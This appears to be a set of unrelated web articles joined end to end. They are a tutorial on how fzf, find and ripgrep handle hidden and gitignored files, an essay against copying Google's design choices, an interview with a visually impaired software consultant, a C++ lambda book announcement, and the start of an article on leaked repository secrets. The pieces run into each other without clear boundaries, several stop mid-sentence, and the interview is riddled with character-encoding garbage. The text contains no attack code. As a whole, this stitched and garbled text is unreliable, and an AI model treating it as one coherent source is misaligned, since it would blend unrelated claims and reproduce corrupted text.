<p><em>“Without STDIN pipe, fzf will use find command to fetch the list of files excluding hidden ones.”</em></p>

<p>At first, I stopped reading after “fzf will use find command to fetch the list of files”, and missed the “excluding hidden ones”.</p>

<p><a name="basic-uses-of-find"></a>
<strong>Basic uses of <code>find</code></strong></p>

<p>That careless omission did cause me a pleasant coffee length digression into the nuances of basic uses of the <code>find</code> command. I created a set of test files and directories like this, some hidden, some not, as you can see:</p>

<div><div><pre><code><span>.</span>
├── Fruit
│&nbsp;&nbsp; ├── apple
│&nbsp;&nbsp; ├── banana
│&nbsp;&nbsp; ├── cherry
│&nbsp;&nbsp; └── .damson
├── .Trees
│&nbsp;&nbsp; ├── ash
│&nbsp;&nbsp; └── birch
├── aardvark
├── badger
└── .cow
</code></pre></div></div>

<p>If pressed, I’d say that I’d naturally use the following incantation as a basic way to find files and directories: <code>find . -type f</code>. The results are interesting.</p>

<blockquote>
  <p>In all the following examples, I’m in the directory denoted by <code>.</code> at the top of the tree as shown above. The <code>;</code> is my simple prompt (inspired by <a href="https://twitter.com/thingskatedid">Kate</a>), with my directory location shown in a line above that (<code># /tmp/testdir</code>).</p>
</blockquote>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f
./Fruit/apple
./Fruit/cherry
./Fruit/.damson
./Fruit/banana
./.cow
./aardvark
./.Trees/birch
./.Trees/ash
./badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(9 entries)</p>

<p>I’d always considered that the “default” behaviour, but on reflection, it’s arguably not default, as I’m using something specific (<code>.</code>) as the first argument to <code>find</code>, whereas I could just as easily have used <code>*</code>, thus:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>*</span> <span>-type</span> f
Fruit/apple
Fruit/cherry
Fruit/.damson
Fruit/banana
aardvark
badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(6 entries)</p>

<p>That’s quite a difference! The Stack Overflow entry <a href="https://stackoverflow.com/questions/46578534/difference-between-find-and-find-in-unix">Difference between find . and find * in unix</a> confirms that difference.</p>

<ul>
  <li>passing <code>.</code> results in everything in <code>.</code> being found, including the hidden file <code>.cow</code> and the hidden directory (and its contents) <code>.Trees/</code></li>
  <li>passing <code>*</code> results in only the “visible” content in <code>.</code> being returned; note that this visibility difference only applies to the starting directory in question - as <code>Fruit/.damson</code> was reported even though <code>.cow</code> and <code>.Trees/</code> weren’t</li>
</ul>

<p>So I wonder if either of these two incantations are what <code>fzf</code> uses by default. Let’s see what <code>fzf</code> gives, in this same starting directory:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  5/5
<span>&gt;</span> Fruit/apple
  Fruit/cherry
  Fruit/banana
  aardvark
  badger
</code></pre></div></div>

<p>(5 entries)</p>

<p>Nope!</p>

<p>Of course, there’s that “excluding hidden ones” phrase from the README to which I must now pay attention. What I need is to tell <code>find</code> explicitly to exclude hidden files and directories. This will do the trick:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
./Fruit/apple
./Fruit/cherry
./Fruit/banana
./aardvark
./badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p>That’s more like it! In fact, because we’re explicitly excluding content based on a pattern, the same results are forthcoming whether we use a <code>.</code> or <code>*</code> as the first argument to <code>find</code>. Here’s what we get with a <code>*</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>*</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
Fruit/apple
Fruit/cherry
Fruit/banana
aardvark
badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p>OK, there is a subtle difference, in that in this latter case, the <code>./</code> prefix is not included in the output of each entry. This is closest to what we see with <code>fzf</code> too.</p>

<p><a name="FZF_DEFAULT_COMMAND"></a>
<strong>FZF_DEFAULT_COMMAND</strong></p>

<p>So if I wanted <code>fzf</code> to actually show me hidden files, how would I do that? Well of course one way would be to run the appropriate <code>find</code> command and then pipe the output into <code>fzf</code>, like this:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f  | fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  9/9
<span>&gt;</span> ./Fruit/apple
  ./Fruit/cherry
  ./Fruit/.damson
  ./Fruit/banana
  ./.cow
  ./aardvark
  ./.Trees/birch
  ./.Trees/ash
  ./badger
</code></pre></div></div>

<p>But I want to leave the pipeline approach until another time. Can I influence <code>fzf</code>’s search behaviour when, as the README puts it, “input is [the] tty”?</p>

<p>The answer is yes and is in the form of the environment variable <code>FZF_DEFAULT_COMMAND</code>. If set, <code>fzf</code> will use its value as the command to execute to find the files to display. So instead of using the pipeline above, I could do this:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> <span>export </span><span>FZF_DEFAULT_COMMAND</span><span>=</span><span>'find . -type f'</span>
<span># /tmp/testdir</span>
<span>;</span> fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  9/9
<span>&gt;</span> ./Fruit/apple
  ./Fruit/cherry
  ./Fruit/.damson
  ./Fruit/banana
  ./.cow
  ./aardvark
  ./.Trees/birch
  ./.Trees/ash
  ./badger
</code></pre></div></div>

<p>Nice - now <code>fzf</code> shows me hidden files.</p>

<p><a name="alternative-commands"></a>
<strong>Alternative commands</strong></p>

<p>If we can modify what <code>fzf</code> uses to find files, we can go further, as the README suggests, and use another utility entirely, as described in the README’s <a href="https://github.com/junegunn/fzf#tips">Tips</a> section (and hinted at also in the <a href="https://github.com/junegunn/fzf#environment-variables">Environment variables</a> section).</p>

<p>I’ve installed the search utility <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a>, known as <code>rg</code>, as it works for me in a more natural <a href="https://en.wikipedia.org/wiki/DWIM">DWIM</a> (Do What I Mean) mode.</p>

<p>Let’s see what <code>rg</code> will do for us with the same content. It is as much like <code>grep</code> than <code>find</code> and so we need to tell it to search at the file level, with <code>--files</code>, for the purposes of this exploration:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
Fruit/banana
Fruit/cherry
Fruit/apple
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p><code>rg</code> won’t consider hidden files and directories unless told to explicitly with <code>--hidden</code>:</p>

<div><div><pre><code># /tmp/testdir
; rg --files --hidden
badger
.Trees/ash
.Trees/birch
aardvark
.cow
Fruit/banana
Fruit/.damson
Fruit/cherry
Fruit/apple
# /tmp/testdir
;
</code></pre></div></div>

<p>(9 entries)</p>

<p>At this level, <code>rg</code> delivers results similar to what we already get with <code>find</code>.</p>

<p><a name="respecting-.gitignore"></a>
<strong>Respecting .gitignore</strong></p>

<p>Where <code>rg</code> comes into its own, DWIM-like, is when the search in question is within a git repository. In that case, it will respect what you have in your <a href="https://git-scm.com/docs/gitignore"><code>.gitignore</code></a> file.</p>

<p>I was curious to see this in action in the context of the simple set of files above. I added a <code>.gitignore</code> file in <code>/tmp/testdir</code> containing a single entry (<code>Fruit</code>) and then ran both <code>find . -type f -not -path '*/\.*'</code> and <code>rg --files</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> <span>cat</span> .gitignore
Fruit
<span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
./Fruit/apple
./Fruit/cherry
./Fruit/banana
./aardvark
./badger
<span># /tmp/testdir</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
Fruit/banana
Fruit/cherry
Fruit/apple
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>Hmm, so what’s going on here? They both produce the same list of files, despite the presence of the <code>.gitignore</code> file and its contents.</p>

<p>Turns out that it will only respect <code>.gitignore</code> in the context of an actual git repository, which makes sense. So a quick <code>git init</code> in the directory later, and we now see a different result for <code>rg --files</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> git init
Initialized empty Git repository <span>in</span> /private/tmp/testdir/.git/
<span># /tmp/testdir (master #%)</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
<span># /tmp/testdir (master #%)</span>
<span>;</span>
</code></pre></div></div>

<p>That’s more like it - the <code>Fruit/</code> directory and its contents are ignored.</p>

<p><a name="using-rg-for-real"></a>
<strong>Using rg for real</strong></p>

<p>Moving back to the <a href="https://github.com/SAP-samples/teched2020-developer-keynote">repository</a> content that I have been using to explore <code>fzf</code> in more depth (especially in <a href="https://qmacro.org/autodidactics/2021/02/02/fzf-the-basics-1-layout/">fzf - the basics part 1 - layout</a>), let’s see what effect <code>rg</code>’s respect for <code>.gitignore</code> has on the results in this more realistic scenario.</p>

<p>First, what does the incantation of <code>find</code> that most closely resembles <code>fzf</code>’s default behaviour give us from the top level of that repository?</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>  | <span>wc</span> <span>-l</span>
   17688
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>OK, so that’s what we got in the <a href="https://qmacro.org/autodidactics/2021/02/02/fzf-the-basics-1-layout/">previous post</a>. The repository has a <code>.gitignore</code> file:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> <span>cat</span> .gitignore
node_modules/
<span>*</span>.swp
sk<span>*</span>.json
default-env.json
.DS_Store
dashboard.zip
mta_archives/
ui/resources
<span>*</span>.db-journal
<span>*</span>.token
kubeconfig.<span>*</span>
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>So let’s see what <code>rg</code> gives us:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> rg <span>--files</span> | <span>wc</span> <span>-l</span>
     163
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>That is certainly a huge difference, mostly a result of ignoring a load of stuff - not least in the various <code>node_modules/</code> directories within the repository.</p>

<p><a name="showing-hidden-files"></a>
<strong>Showing hidden files</strong></p>

<p>Now that the list of choices is more manageable, I can now start to think about what it actually contains, and what it doesn’t contain. There are hidden files in the repository that I actually want to be able to select. <code>fzf</code>’s default behaviour is preventing that from happening, but it’s only now that my head is clear enough to address this (looking through a list of 17000+ files fogged my thinking).</p>

<p>So I remember I can use the <code>--hidden</code> option with <code>rg</code>; let’s try that:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> rg <span>--files</span> <span>--hidden</span> | <span>wc</span> <span>-l</span>
     209
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>OK, so a few more than the 163 that <code>rg --files</code> returned. Good stuff. But what are those extra …</p></div></article></div></div></div>

<p>“That’s not what Google’s doing!” is a phrase I’ve heard all too often in my career to criticize product solutions. It’s a preposterous statement because it implies that decisions differing from Google's are inherently wrong, and must be righted by copying their solution pixel for pixel. The problem is that doing so doesn’t often lead to success, for a wide variety of reasons.&nbsp;</p>



<p>The first is simply because no one is going to beat Google at Google. They’re operating at a completely different scale, with limitless resources, in a unique position in the marketplace, and are almost certainly offering a unique product. Copying them just ensures you’re permanently behind. By the time the copier designs, builds, markets, and releases their copy, Google or any other competitor will have improved further, and have continued to win a larger pie of the market.&nbsp;</p>



<p>Don’t get me wrong, Google has a long track record of consistently launching successful products. Google Stadia seems to be <a href="https://www.cnn.com/2021/02/01/tech/google-stadia-sge-shutdown/index.html" target="_blank" rel="noreferrer noopener">going really well</a>, Google+ had <a href="https://www.techtimes.com/articles/51205/20150506/many-users-google-really.htm#:~:text=Officially%2C%20Google%2B%20has%20more%20than,as%20many%20members%20as%20Facebook." target="_blank" rel="noreferrer noopener">a billion users</a>, Google Wave was basically <a href="https://gizmodo.com/what-in-the-hell-was-google-wave-trying-to-be-anyway-1835038967" target="_blank" rel="noreferrer noopener">Slack before Slack</a>, and Google Glass is apparently <a href="https://www.google.com/glass/start/https://www.google.com/glass/start/" target="_blank" rel="noreferrer noopener">still a thing</a>! The reality is that Alphabet is mega successful because the vast majority of its revenue comes from its advertising platform, which primarily earns cash off of its first product… Google Search.</p>



<p>But what about Material Design? I know I’ve established my ability for sarcasm but Material Design is actually a fantastic design system, and they keep improving it. In late 2019, Google performed hundreds of usability testing sessions and hundreds of preference ranking sessions to investigate the usability and accessibility of their form fields. <a rel="noreferrer noopener" href="https://medium.com/google-design/the-evolution-of-material-designs-text-fields-603688b3fe03" data-type="URL" data-id="https://medium.com/google-design/the-evolution-of-material-designs-text-fields-603688b3fe03" target="_blank">The results</a> showed that their form fields performed poorly, especially when filled with large amounts of text.</p>



<figure><img loading="lazy" src="https://brandonsax.com/wp-content/uploads/2021/02/0_yTxoZXR5wDzrAj5D-1.png" alt="" width="1024" height="329"><figcaption>Google's old form fields (left) and one of their improved test versions (right) </figcaption></figure>



<p>Afterwards, some writers called out that Google <a href="https://www.matsuko.ca/blog/stop-using-material-design-text-fields/" target="_blank" rel="noreferrer noopener">got it wrong</a>, but I know that Google didn’t know any better. If only I had applied to Google on April 3, 2016 and documented the usability opportunities of their form fields, specifically within their application experience. Oh wait, I had. Let’s read those receipts, shall we?</p>



<p>“There is little visual distinction between subsections, such as in individual jobs. This leads to confusion when identifying which details pertain to which job, especially when the user is in the midst of input. This problem is exacerbated by the large distance between individual fields, and that distance also is inconsistent within subsections.” (Bless up to Evernote for saving this.) Google could have saved all that money and effort had they actually read my application three and a half years earlier. Just saying! I’m not bitter! Really!</p>



<h4>Bare Minimum</h4>



<p>“This is industry standard,” is the broader example of copying Google, and when the phrase is used to defend work to stakeholders, it’s typically followed by heads around the room nodding along, either in bliss knowing that the solution has been soundly justified, or in fear of questioning the status quo. The problem is apparent in the term itself. "Industry standard” means “the&nbsp;generally accepted <em>requirements</em> followed by the members of an industry.” So when you justify a decision with that, you’re aiming for the bare minimum, probably because it’s easy, acceptable, and doesn’t rock the boat. Just know that aiming for that low bar doesn’t lead to market success.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="690" src="https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people-1024x690.jpg" alt="" srcset="https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people-1024x690.jpg 1024w, https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people-300x202.jpg 300w, https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people-768x518.jpg 768w, https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Stakeholders when they hear that something is industry standard.</figcaption></figure>



<p>Of course there are obvious exceptions. I’m happy there are construction standards so buildings have fire escapes, don’t collapse, and accommodate all people. As a product designer, I’m happy there are standard patterns so engrained into user’s behavior that if I leverage those patterns, users will already know how to use the product, like a navigation bar or form field. That said, a standard building isn’t going to garner any awards for sustainability or architecture, and I still have to make decisions regarding how more complex functionality should be displayed to the user while making the experience feel intuitive.&nbsp;</p>



<h4>Is it really industry standard?</h4>



<p>I question whether “That is industry standard” is even true. Was industry research actually performed by evaluating the competition, summarizing the pros and cons of each approach, and arriving at a conclusion to copy a competitor? In most cases the answer is no. It’s a convenient argument in the moment because it’s one less thing for the speaker to do. Their time saved on research and thinking is paid for with the opportunity-cost of innovation, preventing the speaker from leapfrogging the competition and radically improving an area of the industry.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="576" src="https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-1024x576.jpg" alt="" srcset="https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-1024x576.jpg 1024w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-300x169.jpg 300w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-768x432.jpg 768w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Kirk Goldsberry, Top 200 Shot Locations in the NBA</figcaption></figure>



<p>If you dig into the history of why something is standard, you may uncover that the solution has never been carefully considered, like how until ten years ago, professional basketball players took their shots on the court in remarkably inefficient places. It could also be that the standard hasn’t kept up with technological advancements, like Nuclear power. Almost all power plants in existence today are based off designs made with slide rulers, not computers, and are ripe for innovation. Either way, real problems may exist in the status quo that have been ignored or people grew blind to. If you’re coming into a new project, you’re at the perfect time to reevaluate assumptions and innovate. It’s much cheaper to consider something in the research and design phase than once it’s built and you need to shoehorn a solution in.&nbsp;</p>



<h4>Psychology of Industry Standard</h4>



<p>The urge to copy big brands comes from heuristics. Heuristics are basically mental shortcuts, and the study of them tells us that humans are risk-adverse and cognitively lazy. We see something that works and instinctively copy it to avoid failure, which has the added benefit of conserving our cognitive load. At Google’s scale their product decisions also become the “default” in many people’s minds, and deviating from that is scary, but ironically copying a large institution like Google <a href="https://www.nngroup.com/articles/risks-imitating-designs/" target="_blank" rel="noreferrer noopener">brings a high risk of failure</a>. It’s like copying the winning lottery numbers from two days ago; it’s a verbatim repeat of successful steps but in a completely different set of circumstances. It’s not any more likely to work than anything else.&nbsp;</p>



<h4>Conclusion</h4>



<p>For a product to have success, it’s critical for it to have a unique market fit, and the way to do that is to make your own decisions. Evaluate your unique situation and build accordingly. Each product has unique qualities that earn customers, and success is earned through empowering those customers to succeed while generating value for the business.</p>

			<p><strong>Have you ever thought of doing your daily job without sight</strong>? I must admit, I would not have any clue of where to start, but a very close friend of mine is going exactly through this and I think itâ€™s worth to share his story.</p>

<p>When I met Weber in 2006, we were both exchanging computer science students in Seville, Spain. I just arrived there, did not speak a word of spanish, and was looking for a room to rent. We were visiting the same flat and there was only one room available, a double room. So, after 5 minutes, we both decided to take that double room together.</p>

<p><img src="https://michelenasti.com/images/weber-pizza.JPG" alt="When he came to visit me, we did pizza in my pizza oven"></p>

<p><em>Thatâ€™s Weber learning how to make pizza in Italy, around 2008.</em></p>

<p>Probably only at 21 you can think of renting a room for 6 months with an unknown person, and this could go bad in many ways, but luckily it turned so well weâ€™re close friends that also meet from time to time, even if we live in two different continents. He currently lives in Houston, Texas, where he works as a software consultant. He runs the blog <a href="https://www.dislexiavisual.net/">Dislexia Visual</a> (portuguese; English-translated version <a href="https://translate.google.com/translate?hl=&amp;sl=pt&amp;tl=en&amp;u=https%3A%2F%2Fwww.dislexiavisual.net%2F">here</a>). At the time he managed to do several day jobs to pay his overseas studies, then go to party at night and hang out with friends: such a great determination!</p>

<p>When I got to know him better, he told me about the issues with his eyes: he already knew that in a couple of years he was going to be blind. He visited a moltitude of doctors, and all of them have told him the same thing, <strong>â€œyou should have already been blind by nowâ€�</strong>. He went through many surgeries. Luckily, his body didnâ€™t surrender that easy and he still has a tiny fraction of sight.</p>

<p>With this interview Iâ€™d like to put some light on something that may happen to all of us, not only IT professionals. If even one of you will change the color pattern, or think about accessibility for a second, Iâ€™ll have achieved my goal.</p>

<hr>

<h4 id="first-question-is-an-introduction-to-you-who-is-weber-where-did-you-grow-up-study-work">First question is an introduction to you: who is Weber, where did you grow up, study, work..</h4>

<p>Iâ€™m Weber Amaral, 36, and was born in southern Brazil. I lived in a small town in the country side my entire childhood. I studied Computer Science at UTFPR (Brazil) and when I was 21 y/o, I moved to Spain, where I spent a whole year in a student interchange program at the University of Seville and also had an internship in an automotive industry at the same city. Back to Brazil I moved to Sao Paulo (countryâ€™s largest city) to work for Siemens. After 7 years there, I received an offer to move to Houston, Texas, where iâ€™ve been living for the last 6 years with my amazing wife, Carol.</p>

<h4 id="what-is-the-issue-with-your-sight">What is the issue with your sight?</h4>

<p>When I was 6 y/o, I loved going to school. One day though, finding me too talkative, <strong>my kindergarten teacher sat me in the back of the classroom. She then noticed I couldnâ€™t see anything she put on the board.</strong> She called my parents, who took me to the eye doctor. We then found out I had only 5% of my sight in both eyes due to a vascular and autoimmune disease called <a href="https://en.wikipedia.org/wiki/Uveitis"><em>pars planitis</em></a>. Since then, Iâ€™ve gone through <strong>more than 50 surgeries</strong> and lost the sight on the right eye around 6 years ago. The left eye was doing its work â€œwellâ€� until it really start a new phase of degeneration almost 3 years ago. So, everyday for me now is a new discovery, since my vision is getting worse and worse.</p>

<h4 id="what-is-your-daily-job-how-do-you-spend-a-typical-day-do-you-program">What is your daily job? How do you spend a typical day? Do you program?</h4>

<p>Since I graduated, in 2008, Iâ€™ve been working as a software consultant for different process industries, such as Oil &amp; Gas, Chemicals, Petrochemicals, Steel Mill, Foods &amp; Beverages, Pulp &amp; Paper, etc. The 7 first years in Brazil, I performed multiple roles, which envolved coding, but also software deployment, requirements design and project management. In the last 6 years, in the US, Iâ€™m a software consultant of a specific Siemens tool, called XHQ. We design solutions for Operations Intelligence. Thus, my work involves requirements specification, solution design and software deployment. Coding nowadays for me is restricted to JavaScript, SQL, XSLT, PowerShell and a little bit of C#.</p>

<h4 id="what-tech-tools-help-you-in-your-daily-job">What tech tools help you in your daily job?</h4>

<p>All my work environement is Windows, from client to servers. So, with the vision I have today, for now the accessibility tools contained inside the MIicrosoft OS have helped me to execute my daily job. I do have a <strong>big issue with light screens</strong>, so I use the Windows 10 dark mode (also for Office, Visual Studio and others). I also use extensions, such as <em>Dark Reader, Midnight Lizard</em> and others to transform regular websites in dark mode. Besides that, the magnifier (both PC and phone) are also very useful for me. I donâ€™t use PC voice command very often, but the Google Assistant is an everytime friend for me.</p>

<h4 id="are-there-any-subsides-from-the-government-or-the-company">Are there any subsides from the government, or the company?</h4>

<p>I am currently registered as a visually impaired in the Texas Workforce, a state agency responsible for supporting workers and employers in order to maintain a sustainable economic prosperity for all. In other words, they can help me to keep my job. Currently, the main benefit I get from them is the O&amp;M training (<em>Orientation &amp; Mobility training)</em>, which provides me with the tools and techniques to keep my independency despite of the vision degradation. On the same topic, my company acknowledges my situation and we work together in order to keep my productivity, while they provide me with all the required tools, devices and softwares.</p>

<h4 id="do-you-feel-discriminated-by-your-colleagues">Do you feel discriminated by your colleagues?</h4>

<p>Not at all by my colleagues. I am very very blessed to work at the environment I currently do. Even <strong>when I donâ€™t feel comfortable to execute some activity due to my eye condition, the whole team is very supportive and we all work quickly to switch assignments.</strong> With that, I feel very empowered to tell my team what is OK or not for me to execute. But, i understand I am very lucky to be on that position and Iâ€™m pretty sure other people with disability might not fit in this scenario. All of this is related to my work environment, which again, is very positive for me. Nevertheless, there are other nuances when we discuss discrimination on the society as a whole, where, unfortunately, not always I feel as comfortable as I mentioned above.</p>

<h4 id="do-you-think-that-you-can-change-job-in-the-future">Do you think that you can change job in the future?</h4>

<p>I pretty much like what I do today and, most important, I feel very comfortable in the work environment I am right now. However, I definetely understand that <strong>the worse my vision gets, the more I have to adapt my carrer</strong>. That means that, at some point, the adaptations will be too significant and the changes will be more profound. So, answering the question, I donâ€™t plan or want to change job right now, but <strong>I also have no clue what comes next</strong>.</p>

<h4 id="what-is-your-biggest-fear">What is your biggest fear?</h4>

<p>Well, my biggest fear is to live in a society which does not understand how difficult everything is for a person with disability. Unfortunately, there isnâ€™t much I can do to improve my sight and I am very conscient about future brings to me. Thus, my real fight is to make sure that people like me will always have good opportunities in life and do not suffer any type of discriminations.</p>

February 8, 2021 | https://www.cppstories.com/2021/lambda-story-print/ | <a href="https://web.archive.org/web/*/https://www.cppstories.com/2021/lambda-story-print/">archive.org</a>

          <p><img src="https://www.cppstories.com/2021/images/lambda_print.png" alt=""></p>  
          
        

<p>I’m happy to announce the <strong>print/paperback version</strong> of C++ Lambda Story! After more than a year of updates and smaller changes, the whole project is completed! You can now purchase the book in lots of different formats. See details of this major update and also take part in <strong>a giveaway</strong> and get the book for free :)</p>

<h2 id="changes">Changes</h2>

<p>Last time the book had 149 pages, and with this recent update, it’s now 158.</p>

<p>Notable changes:</p>

<ul>
<li>Index at the back of the book.</li>
<li>Nice diagrams for the lambda syntax.</li>
<li>An extended chapter about top lambda advantages.</li>
<li>New section about refactoring with IIFE.</li>
<li>A lot of layout changes and fixes for better print quality.</li>
<li>Code samples have their separate repository - see at <a href="https://github.com/fenbf/cpplambdastory-code">github.com/fenbf/cpplambdastory-code</a>.</li>
</ul>

<h2 id="background">Background</h2>

<p>On my website, you can read at least five extensive articles that describe all the essential parts of lambdas:</p>

<p>Have a look if you haven’t read it before:</p>

<ul>
<li><a href="https://www.cppstories.com/2019/02/lambdas-story-part1.html">Lambdas: From C++11 to C++20, Part 1</a></li>
<li><a href="https://www.cppstories.com/2019/03/lambdas-story-part2.html">Lambdas: From C++11 to C++20, Part 2</a></li>
<li><a href="https://www.cppstories.com/2020/05/lambdasadvantages.html">5 Advantages of C++ Lambda Expressions and How They Make Your Code Better</a></li>
<li><a href="https://www.cppstories.com/2020/05/lambdas-async.html">C++ Lambdas, Threads, std::async and Parallel Algorithms</a></li>
<li><a href="https://www.cppstories.com/2016/11/iife-for-complex-initialization.html">C++ Tricks: IIFE for Complex Variable Initialization</a></li>
</ul>

<p>I packed my knowledge about lambdas into a beautiful ebook, with lots of examples and additional descriptions.
And just as with my book about C++17, I made it available at Leanpub.
The platform makes it easy for me to publish new updates, and everyone who has the book can immediately access the latest changes (at no charge).
Also, the platform allows you to read it as PDF and Epub, Mobi or Online.</p>

<p>As the final step, I made the book available in Print on Amazon.</p>

<p>Here’s the list of the things you can learn:</p>

<ul>
<li>C++<sup>98</sup>⁄<sub>03</sub> - What was the motivation for the new C++ feature?</li>
<li>C++11 - Early days: You’ll learn about all the essential aspects of lambdas and several tricks you might apply. This is the longest chapter as we need to cover a lot of topics.</li>
<li>C++14 - Updates: See how to use generic lambdas and captures with an initialiser.</li>
<li>C++17 - More improvements, especially by handling <code>this</code> pointer and allowing <code>constexpr</code>. You’ll also learn how to leverage the overloaded pattern.</li>
<li>C++20 - In this chapter, you’ll see all of the new features adopted for C++20 like template lambdas and how to use them with concepts and <code>constexpr</code>  algorithms.</li>
</ul>

<h2 id="print-version-at-amazon">Print Version at Amazon</h2>

<p>I completed the ebook version in Nov 2020 and spent the recent weeks adjusting that for the print version.</p>

<p>Amazon KDP makes it easy to publish this book in Print on Demand form. The book has 163 pages (print version), and Amazon needs around 3$ to print it and then it takes 40% of the revenue. The rest 60% is for me, and it’s almost the same as my royalty portion from the minimal price on Leanpub.</p>

<p>Here’s a work-in-progress version from January :) On top, there’s the final front cover.</p>

<p><img src="https://www.cppstories.com/2021/images/lambda_in_progress.jpg" alt=""></p>

<p>The book is printed in Black&amp;White. Here’s a sample screen:</p>

<p><img src="https://www.cppstories.com/2021/images/inside_lambda.jpg" alt=""></p>

<p>You can buy the book here:</p>

<ul>
<li>Amazon.com: <a href="https://www.amazon.com/dp/B08VLM1R76">https://www.amazon.com/dp/B08VLM1R76</a></li>

</ul>

<h3 id="full-color-version">Full Color Version</h3>

<p>Additionally, I also created a full-colour version with a nice syntax colouring and images. The price is much higher than the black&amp;white version (33.99$) though. It’s because of the Amazon printing cost 13$ vs 3$. But my royalty portion is the same in both versions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><nav></nav><section><div><div><p>Accidentally leaking secrets — usernames and passwords, API tokens, or private keys — in a public code repository is a developers and security teams worst nightmare. Fraudsters constantly scan public code repositories for these secrets to gain a foothold in to systems. Code is more connected than ever so often these secrets provide access to private and sensitive data — cloud infrastructures, database servers, payment gateways, and file storage systems to name a few. But what happens <em>after</em> a secret is leaked? And what is the potential fallout?</p>
<h4>
Fraudsters compromised our cloud infrastructure in less than a minute after leaking AWS keys to a public GitHub repository
</h4>
<p>One thing is for certain: the fallout can be catastrophic in terms of financial loss and reputational damage. The now-infamous Uber data breach of 2016 was the result of an engineer accidentally uploading credentials to a public GitHub repository. These credentials allowed bad actors to access Uber's backend databases and confidential information. This breach ultimately resulted in a then-record-breaking <a href="https://www.theguardian.com/technology/2018/sep/26/uber-hack-fine-driver-data-breach" target="_blank" rel="nofollow">$148 million fine</a> — ouch.</p>
<p>More recently, the sophisticated hack against IT management software giant SolarWinds could of originated from <a href="https://www.theregister.com/2020/12/16/solarwinds_github_password/" target="_blank" rel="nofollow">exposed file server credentials in an engineers GitHub repository</a>. This supply-chain attack and the resulting fallout will go down as one of the largest in history, joining the likes of WannaCry. The hack affected over 18,000 SolarWinds customers including various US federal agencies and tech-giants such as Microsoft and FireEye. As news of the hack broke, SolarWinds saw it's market cap cut in half and fall by billions of dollars after it's share price dipped below pre-IPO levels.</p>

</span></p>
<p>Thankfully these hard-hitting headlines are the exception and not the rule. We can look to publicly disclosed reports on bug bounty platforms such as HackerOne to get a feel for how often these secrets are being found and reported. At least by the good guys. These three reports from 2020 could easily have been a front page headline or resulted in huge regulatory fines — they got lucky.</p>
<ol>
<li>The <strong><a href="https://hackerone.com/reports/799898" target="_blank" rel="nofollow">U.S. Department of Defense</a></strong> exposed administrative credentials of their GitLab Enterprise server on GitHub, allowing access to their private code repositories.</li>
<li>Not for the first time, leaked credentials on GitHub from <strong><a href="https://hackerone.com/reports/694931" target="_blank" rel="nofollow">Equifax</a></strong> allowed for access to an API endpoint exposing PII information of Costa Rican citizens.</li>
